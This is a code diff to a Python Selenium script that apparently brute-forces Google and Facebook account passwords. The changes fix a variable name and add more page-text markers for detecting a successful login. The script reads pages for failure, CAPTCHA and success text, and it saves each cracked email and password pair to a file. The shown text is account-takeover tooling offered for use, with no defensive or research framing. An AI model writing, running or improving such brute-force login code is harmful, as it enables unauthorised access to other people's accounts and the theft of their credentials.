@@ -336,7 +336,7 @@ def main():
               driver.quit()
             except selenium.common.exceptions.TimeoutException:
                 
-              page_ = bs(driver.page_source, 'html.parser').text
+              page_now = bs(driver.page_source, 'html.parser').text
                
               if r"Couldn’t find your Google Account" in page_:
                 print(f'{red}Couldn\'t find the google account {email_or_phone}{plain}')
@@ -347,7 +347,7 @@ def main():
                 driver.quit()
                 break
                   
-              elif "Confirm that you’re not a robot" in page_:
+              elif "Confirm that you’re not a robot" in page_now:
                 captcha.extend(check_password)
                 print(f'{red}Captcha detected {plain}')
                 if len(captcha) > 5:
@@ -355,7 +355,7 @@ def main():
                   driver.quit()
                   break
   
-              elif r"You're signed in" in response_ or   r"Recovery information" in response_ or r'2-step verification' in response_:
+              elif r"You're signed in" in page_now or   r"Recovery information" in page_now or r'2-step verification' in page_now or 'Account recovery' in page_now:
                 print(f'{green}Correct password : {check_password}{plain}')
                 driver.quit()
                 save_passwords.write(f'{username_email} - {check_password} - Google - {time.time()}\n')
@@ -449,7 +449,7 @@ def main():
                     del_mem = memory(username_email,2,None,None)
                     del_mem.terminate_()
                     break
-                  if  'Find friends' in page_now or 'authentication' in page_now or 'recovery information' in page_now:
+                  if  'Find friends' in page_now or 'authentication' in page_now or 'recovery information' in page_now or 'Check your notifications' in page_now:
                     print(f'{yellow} {check_password} is the correct password{plain}')
                     driver.quit()
                     save_passwords.write(f'{username_email} - {check_password} - Facebook - {time.time()}\n')
